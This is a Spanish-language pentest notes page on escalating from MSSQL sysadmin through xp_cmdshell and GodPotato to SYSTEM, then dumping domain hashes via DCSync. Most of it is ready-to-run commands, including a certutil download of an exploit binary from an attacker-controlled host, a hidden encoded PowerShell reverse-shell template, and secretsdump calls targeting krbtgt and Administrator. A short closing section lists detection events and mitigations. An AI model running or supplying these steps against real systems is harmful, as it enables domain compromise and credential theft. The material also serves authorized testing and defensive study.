---
title: MSSQL — de sysadmin a SYSTEM y a DCSync
tags: [windows, mssql, xp_cmdshell, godpotato, dcsync, privesc]
---

# MSSQL: ejecución, SYSTEM y DCSync

[🇬🇧 English](mssql-exec.en.md) | **Español**

Complemento de [MSSQL: credenciales y SeBackupPrivilege](mssql-credentials-sebackup.md). Aquí el objetivo no es leer secretos guardados, sino **ejecutar código** desde SQL Server y seguir escalando hasta el dominio.

## 1. Llegar a sysadmin

```sql
SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.server_principals WHERE type IN ('S','U') AND is_disabled = 0;
```

Si no eres sysadmin pero tienes `IMPERSONATE`:

```sql
EXECUTE AS LOGIN = '<login_sysadmin>';
SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
-- ... acciones ...
REVERT;
```

## 2. xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
```

- Corre como la **cuenta del servicio** (`NT Service\MSSQLSERVER` o una cuenta de dominio), no como tu login.
- Las cuentas de servicio de SQL suelen tener `SeImpersonatePrivilege`: ahí entra GodPotato.
- La salida llega como filas de texto; para binarios, `-enc` de PowerShell y base64.

## 3. GodPotato (SeImpersonate → SYSTEM)

```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/GodPotato-NET4.exe C:\Windows\Temp\gp.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"';
```

Salida típica: `nt authority\system`. Para una reverse shell:

```text
C:\Windows\Temp\gp.exe -cmd "cmd /c powershell -nop -w hidden -enc <BASE64>"
```

Alternativas: `PrintSpoofer`, `JuicyPotatoNG` (según versión de Windows y privilegios disponibles). GodPotato funciona en Windows Server 2019/2022 y Windows 10/11.

## 4. DCSync con la cuenta comprometida

Si el SYSTEM está en un DC o consigues credenciales de una cuenta con `DS-Replication-Get-Changes`:

```bash
impacket-secretsdump -just-dc-user '<usuario>' '<domain>/<user>@<DC_IP>' -hashes ':<NT_HASH>'
impacket-secretsdump -just-dc-user 'krbtgt' '<domain>/<user>@<DC_IP>' -hashes ':<NT_HASH>'
```

Con `ccache`:

```bash
export KRB5CCNAME='<user>.ccache'
impacket-secretsdump -k -no-pass -just-dc-user 'Administrator' '<domain>/<user>@<dc>.<domain>'
```

## 5. Errores típicos

- **`SQL Server blocked access to procedure 'xp_cmdshell'`** → deshabilitado o sin `CONTROL SERVER`; hay que reactivarlo como sysadmin.
- **`The EXECUTE permission was denied`** → el login no tiene `EXECUTE` sobre el procedimiento; usa impersonación.
- **`Access is denied` con GodPotato** → falta `SeImpersonatePrivilege` (cuenta virtual de servicio) o el binario es de otra arquitectura.
- **`-enc` demasiado largo** → parte el comando o sube un `.ps1`.
- **`rpc_s_access_denied` en secretsdump** → la cuenta no tiene derechos de replicación; busca `DS-Replication-Get-Changes-All`.
- **`KRB_AP_ERR_SKEW`** → reloj; ver [reloj y Kerberos](../general/kerberos-clock.md).

## 6. Detección y mitigación

- **15457** (`xp_cmdshell` cambiado) y **4688** con `cmd.exe`/`powershell.exe` hijos de `sqlservr.exe`.
- **4662** con `DS-Replication-Get-Changes` desde una cuenta que no es DC.
- Procesos `*Potato*` en `C:\Windows\Temp` y descargas con `certutil`.
- Deshabilitar `xp_cmdshell` y `OLE Automation`; ejecutar SQL Server con cuentas virtuales y sin `SeImpersonate` explícito.
- Sacar derechos de replicación a cuentas que no sean DC y auditar `sys.server_permissions`.

MITRE: T1059.003, T1134.001, T1003.006.
